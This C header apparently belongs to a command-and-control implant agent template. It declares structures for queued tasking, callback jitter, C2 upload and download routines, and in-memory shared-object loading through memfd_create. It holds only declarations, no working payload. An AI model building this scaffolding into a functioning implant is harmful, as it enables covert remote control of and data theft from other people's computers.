

#ifndef UTILS_H_
#define UTILS_H_

/* includes */
#include "cJSON.h"
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include "C2PROFILE_NAME_HERE.h"
/* defines */
#define UUID "UUID_HERE"
#define SHM_NAME "tmp"
#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html


typedef struct m_function
{
	/* all module functions take a cJSON structure as an argument and return an integer status code*/
	char* name; //name of the function
	int (*func)(cJSON*); //function to call

}m_function __attribute__ ((visibility ("protected")));
typedef struct m_job
{
    unsigned int task; // task number
    pthread_t *job; //pointer to the running job
    char* command_string; //command + params of the job
    struct m_job * next; //singly linked list of jobs
}m_job __attribute__ ((visibility ("protected")));

typedef struct C2_functions
{
    void (*initial_callback)() __attribute__ ((visibility ("protected")));;
    void (*get_tasking)() __attribute__ ((visibility ("protected")));;
    cJSON* (*post_response)(cJSON*) __attribute__ ((visibility ("protected")));;
    int (*upload)(unsigned int, unsigned char**, unsigned int*) __attribute__ ((visibility ("protected")));;
    int (*download)(FILE*, unsigned int, unsigned int) __attribute__ ((visibility ("protected")));;
} C2_functions __attribute__ ((visibility ("protected")));

typedef struct global_JSON_info
{
	cJSON * tasking; // keeps track of current tasking, will need to be an array so we can iterate over it
	cJSON * callback_info; //keeps track of current info, will need to be an array so we can iterate over it
	unsigned int callback_interval;
	unsigned int callback_jitter;
    unsigned int callback_id;
    unsigned int num_functions;
	m_function *functions; //list of functions in that module
    C2_functions C2;
    m_job * jobs;
} global_JSON_info __attribute__ ((visibility ("protected")));
/* globals */
pthread_mutex_t global_lock __attribute__ ((visibility ("protected"))); //mutex so we can safely update the global_JSON_info structure
global_JSON_info * global_info __attribute__ ((visibility ("protected")));

/* prototypes */
int find_char(char * string, char token, int count);
int find_end_of_headers(char* string);
char* get_ip(int sock_fd);
pid_t get_pid();
char* get_user();
char* get_host();
int initialize();
void add_task_to_queue(cJSON * json);
void update_global_info_from_checkin(cJSON * json);
void update_global_functions(char* name, int (*func)(cJSON *) );
void print_global_info();
m_function* get_tasking_func(cJSON* task);
cJSON* pop_tasking();
int read_from_fd(int fd, char* buff, int buf_size);
int send_basic_response(char * message, int task_id);
void* get_so_handle(unsigned char* in_mem_buffer, size_t length);
char* get_current_jobs();
void add_thread_to_global_info(cJSON* , pthread_t* );
pthread_t * remove_thread_from_global_info(unsigned int );
#endif /* UTILS_H_ */
